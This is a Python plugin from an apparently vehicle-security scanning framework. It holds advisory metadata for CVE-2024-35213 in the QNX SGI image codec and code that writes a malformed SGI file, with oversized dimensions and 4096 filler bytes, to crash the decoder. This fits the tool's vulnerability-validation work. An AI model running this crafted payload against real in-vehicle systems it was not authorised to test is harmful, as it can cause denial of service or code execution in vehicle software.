#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin
from local_exp_stimulus import build_local_sample_probe, write_temp_sample


VULN = {
    "id": 28,
    "cve": "CVE-2024-35213",
    "year": 2024,
    "domain": "车载OS/QNX",
    "vendor_product": "BlackBerry QNX SDP",
    "component": "SGI image codec",
    "type": "输入校验/RCE或DoS",
    "summary": "QNX SDP 6.6/7.0/7.1 SGI图像编解码器输入校验不当，可DoS或代码执行。",
    "source_description": "An improper input validation vulnerability in the SGI Image Codec of QNX SDP version(s) 6.6, 7.0, and 7.1 could allow an attacker to potentially cause a denial-of-service condition or execute code in the context of the image processing process.",
    "poc_status": "未见公开PoC；供应商公告",
    "research_value": "QNX广泛用于IVI、ADAS和域控制器，属于车载基础软件风险。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-35213",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2024-35213",
        "https://support.blackberry.com/pkb/s/article/139914",
        "https://cveawg.mitre.org/api/cve/CVE-2024-35213"
    ],
    "affected": [
        {
            "vendor": "BlackBerry",
            "product": "QNX Software Development Platform (SDP)",
            "versions": [
                {
                    "version": "6.6.0",
                    "status": "affected",
                    "lessThanOrEqual": "7.1",
                    "versionType": "custom"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2024-35213",
        "BlackBerry",
        "QNX",
        "SDP",
        "SGI",
        "image",
        "codec",
        "RCE",
        "DoS",
        "improper",
        "input",
        "validation",
        "vulnerability",
        "Image",
        "Codec",
        "could",
        "allow",
        "potentially",
        "cause",
        "denial-of-service",
        "condition",
        "execute",
        "code",
        "context",
        "processing",
        "process",
        "QNX Software Development Platform (SDP"
    ]
}


def _write_qnx_sgi_sample() -> str:
    payload = (
        b"\x01\xda"
        + b"\x00\x01"
        + b"\x00\x01"
        + b"\xff\xff\xff\xff"
        + b"\xff\xff\xff\xff"
        + b"\x00\x03"
        + b"\x00\x01"
        + b"QNXSGI"
        + b"A" * 4096
    )
    return write_temp_sample("autosec_cve_2024_35213_", ".sgi", payload)


def _sgi_probe(plugin, vuln):
    return build_local_sample_probe(
        plugin,
        sample_param="sgi_sample_path",
        command_params=("qnx_image_decoder_cmd", "decoder_cmd"),
        generated_sample=_write_qnx_sgi_sample,
        phenomenon="crafted SGI sample prepared for QNX SGI codec validation failure or crash observation",
        operator_action="Run sample_path through the QNX SGI decoder via qnx_image_decoder_cmd/decoder_cmd and observe crash, abort, or sanitizer output.",
    )


class Poc19CVE202435213RCEDoSInputValidationAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-028'
    meta_poc_name = 'CVE-2024-35213 输入校验/RCE或DoS Active Validation'
    meta_cve_id = 'CVE-2024-35213'
    meta_severity = 'High'
    meta_protocol = 'local'
    meta_target_os = ['qnx', 'linux']
    meta_required_params = ['software_inventory_text']
    meta_profiles = ['local_artifact']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2024-35213'
    meta_attack_surface = '系统/供应链组件'
    is_disruptive = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_sgi_probe)
